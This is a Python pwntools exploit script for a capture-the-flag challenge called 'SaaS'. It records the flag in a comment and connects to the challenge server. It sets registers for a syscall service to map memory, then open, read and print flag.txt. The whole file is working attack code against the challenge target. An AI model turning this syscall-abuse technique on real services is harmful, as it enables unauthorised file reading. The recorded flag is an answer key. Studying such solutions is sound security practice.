#exploit for SaaS
#flag=flag{rax_rdi_rsi_radical_dude}
from pwn import *
#target=process('./saas')
target=remote('jh2i.com',50016)

print(target.recvline())

def setr(rax,rdi,rsi,rdx,r10=0,r9=0,r8=0):
	values=[rax,rdi,rsi,rdx,r10,r9,r8]
	for value in values:
		print(target.recvuntil("mal): "))
		target.sendline(str(value))

setr(9,0,0x1024,7,0x22)
print(target.recvuntil("Rax: "))
writeaddr=int(target.recvline().strip("\n"),16)
print(hex(writeaddr))
print(target.recvline())

setr(0,0,writeaddr,8)
target.sendline("flag.txt")
print(target.recvlines(2))


setr(2,writeaddr,0,1)
print(target.recvlines(2))

setr(0,6,writeaddr+16,100)
print(target.recvlines(2))

setr(1,1,writeaddr+16,100)
print(target.recvlines(2))

target.interactive()


